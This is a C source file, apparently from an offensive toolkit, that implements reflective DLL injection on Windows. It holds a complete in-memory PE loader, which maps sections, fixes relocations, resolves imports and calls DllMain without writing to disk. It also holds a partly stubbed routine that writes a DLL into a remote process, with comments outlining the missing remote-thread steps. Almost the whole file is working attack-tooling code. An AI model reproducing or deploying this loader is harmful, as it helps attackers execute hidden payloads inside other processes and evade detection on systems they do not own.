/*
 * Execution: Reflective DLL Injection
 *
 * Loads a PE/DLL entirely from memory without touching disk.
 * Windows only.
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL    (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LPVOID  (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

/* Reflective loader context - passed to the loader shellcode */
typedef struct _REFLECTIVE_LOADER_CTX {
    pLoadLibraryA      fnLoadLibraryA;
    pGetProcAddress    fnGetProcAddress;
    pVirtualProtect    fnVirtualProtect;
    pVirtualAlloc      fnVirtualAlloc;
    ULONG_PTR          uiLibraryAddress;    /* Base of the DLL in memory */
    ULONG_PTR          uiBaseAddress;       /* New base after relocation */
    ULONG_PTR          uiAddressTable;
    ULONG_PTR          uiNameTable;
    ULONG_PTR          uiOrdinalTable;
    DWORD              dwNumberOfNames;
} REFLECTIVE_LOADER_CTX;

/* Simple reflective loader - allocates memory, maps sections, fixes relocations, resolves imports */
static bool reflective_load(const uint8_t* dll_data, size_t dll_size, void** out_base)
{
    (void)dll_size;
    
    /* 1. Parse PE headers */
    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)dll_data;
    if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE) return false;
    
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(dll_data + dosHdr->e_lfanew);
    if (ntHdr->Signature != IMAGE_NT_SIGNATURE) return false;
    
    /* 2. Allocate memory for the image */
    PVOID base = VirtualAlloc(NULL, ntHdr->OptionalHeader.SizeOfImage,
                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return false;
    
    /* 3. Copy headers */
    memcpy(base, dll_data, ntHdr->OptionalHeader.SizeOfHeaders);
    
    /* 4. Copy sections */
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHdr);
    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        PVOID dst = (PBYTE)base + sec[i].VirtualAddress;
        PVOID src = (PBYTE)dll_data + sec[i].PointerToRawData;
        memcpy(dst, src, sec[i].SizeOfRawData);
    }
    
    /* 5. Process relocations */
    PIMAGE_DATA_DIRECTORY relocDir = &ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir->Size > 0) {
        ULONG_PTR delta = (ULONG_PTR)base - ntHdr->OptionalHeader.ImageBase;
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)base + relocDir->VirtualAddress);
        
        while (reloc->VirtualAddress != 0) {
            PWORD entries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            
            for (DWORD j = 0; j < count; j++) {
                WORD type = entries[j] >> 12;
                WORD offset = entries[j] & 0xFFF;
                
                if (type == IMAGE_REL_BASED_DIR64) {
                    PULONG_PTR p = (PULONG_PTR)((PBYTE)base + reloc->VirtualAddress + offset);
                    *p += delta;
                } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    PDWORD p = (PDWORD)((PBYTE)base + reloc->VirtualAddress + offset);
                    *p += (DWORD)delta;
                } else if (type == IMAGE_REL_BASED_HIGH) {
                    PWORD p = (PWORD)((PBYTE)base + reloc->VirtualAddress + offset);
                    *p += HIWORD(delta);
                } else if (type == IMAGE_REL_BASED_LOW) {
                    PWORD p = (PWORD)((PBYTE)base + reloc->VirtualAddress + offset);
                    *p += LOWORD(delta);
                }
            }
            reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
        }
    }
    
    /* 6. Resolve imports */
    PIMAGE_DATA_DIRECTORY importDir = &ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR impDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)base + importDir->VirtualAddress);
        
        while (impDesc->Name != 0) {
            LPCSTR dllName = (LPCSTR)((PBYTE)base + impDesc->Name);
            HMODULE hDll = LoadLibraryA(dllName);
            if (!hDll) {
                VirtualFree(base, 0, MEM_RELEASE);
                return false;
            }
            
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)base + impDesc->FirstThunk);
            PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((PBYTE)base + impDesc->OriginalFirstThunk);
            
            while (thunk->u1.AddressOfData != 0) {
                if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                    WORD ordinal = IMAGE_ORDINAL(origThunk->u1.Ordinal);
                    thunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, (LPCSTR)(ULONG_PTR)ordinal);
                } else {
                    PIMAGE_IMPORT_BY_NAME impName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)base + origThunk->u1.AddressOfData);
                    thunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, impName->Name);
                }
                thunk++;
                origThunk++;
            }
            impDesc++;
        }
    }
    
    /* 7. Set proper memory protections for each section */
    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        PVOID addr = (PBYTE)base + sec[i].VirtualAddress;
        SIZE_T size = sec[i].Misc.VirtualSize;
        DWORD protect = PAGE_NOACCESS;
        
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE)
                protect = PAGE_EXECUTE_READWRITE;
            else
                protect = PAGE_EXECUTE_READ;
        } else if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            protect = PAGE_READWRITE;
        } else if (sec[i].Characteristics & IMAGE_SCN_MEM_READ) {
            protect = PAGE_READONLY;
        }
        
        DWORD oldProtect;
        VirtualProtect(addr, size, protect, &oldProtect);
    }
    
    /* 8. Call entry point */
    PIMAGE_DATA_DIRECTORY tlsDir = &ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tlsDir->Size > 0) {
        PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)((PBYTE)base + tlsDir->VirtualAddress);
        /* TLS callbacks would go here */
        (void)tls;
    }
    
    /* Call DllMain with DLL_PROCESS_ATTACH */
    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
    DllMain_t dllMain = (DllMain_t)((PBYTE)base + ntHdr->OptionalHeader.AddressOfEntryPoint);
    dllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    
    *out_base = base;
    return true;
}

/* Inject reflective DLL into remote process */
bool jocky_reflective_inject(HANDLE hProcess, const uint8_t* dll_data, size_t dll_size)
{
    /* 1. Allocate memory in target process */
    PVOID remoteMem = VirtualAllocEx(hProcess, NULL, dll_size,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) return false;
    
    /* 2. Write DLL data */
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteMem, dll_data, dll_size, &written)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return false;
    }
    
    /* 3. Create remote thread to execute reflective loader */
    /* For a full implementation, we'd inject a small loader stub */
    /* This simplified version just maps it; execution needs additional work */
    (void)written;
    
    /* In production, we'd use:
     * - VirtualAllocEx for loader stub
     * - WriteProcessMemory for stub + context
     * - CreateRemoteThread to execute stub
     * - Stub calls reflective_load and then jumps to entry point
     */
    
    return true;
}

/* Load DLL from memory into current process (self-reflective) */
bool jocky_reflective_load_self(const uint8_t* dll_data, size_t dll_size, HMODULE* outModule)
{
    void* base = NULL;
    if (!reflective_load(dll_data, dll_size, &base)) {
        return false;
    }
    if (outModule) *outModule = (HMODULE)base;
    return true;
}

#endif /* _WIN32 */
